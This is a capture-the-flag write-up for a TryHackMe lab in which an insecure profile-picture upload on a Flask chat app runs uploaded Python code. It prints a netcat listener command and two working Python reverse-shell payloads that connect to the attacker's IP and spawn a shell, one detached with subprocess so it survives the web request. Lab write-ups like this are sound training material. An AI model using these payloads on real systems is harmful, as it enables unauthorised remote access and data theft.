## Speed Chat

Room: https://tryhackme.com/room/lafb2026e4

---

### Scenario

Days before Valentine’s Day, TryHeartMe rushed out a new messaging platform called **Speed Chatter**, promising instant connections and private conversations. In the rush to launch, security appears to have been ignored.

Our goal was to identify the weakness in the application, gain code execution, and retrieve the flag.

---

## Initial Assessment

After interacting with the site, the chat feature itself did not appear to return anything useful. That suggested the intended attack surface was likely elsewhere.

The most suspicious feature was the **profile picture upload**. Since the application was running on **port 5000**, it strongly suggested a Python web app, most likely Flask. Rather than continuing to test generic file upload payloads, I shifted focus toward a Python based payload.

---

## Set Up a Listener

Start a listener on your machine

```bash
nc -lvnp 9001
```

---

## First Attempt

I created a Python payload for the upload feature and updated `RHOST` to my own machine.

This payload successfully connected back, but the shell died as soon as the web request finished. That meant it was usable for very quick commands, but unstable for interactive access.

```python
import socket
import os
import pty

RHOST = "10.65.67.117"
RPORT = 9001

s = socket.socket()
s.connect((RHOST, RPORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("sh")
```

### Why it failed

The uploaded script was being executed in the context of the web request. Once that request completed, the process handling the payload ended, which killed the shell.

---

## Stable Reverse Shell

To keep the shell alive, I changed the approach and used `subprocess.Popen` to launch a separate child process. That child process created the reverse shell independently, so it stayed alive even after the web request returned.

```python
import subprocess

subprocess.Popen([
    "python3",
    "-c",
    'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.64.87.138",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
])
```

After uploading and triggering the payload, I received a stable shell on my listener.

---

## Capture the Flag

Once connected, the flag was available in the current working directory, so I simply read it:

```bash
cat flag.txt
```
---

## Summary

The vulnerability was in the **profile image upload handling**, which allowed execution of uploaded Python code.

The key takeaway was that a direct reverse shell worked only briefly because it ran inside the request lifecycle. Spawning a separate process solved that problem and provided a stable shell long enough to retrieve the flag.
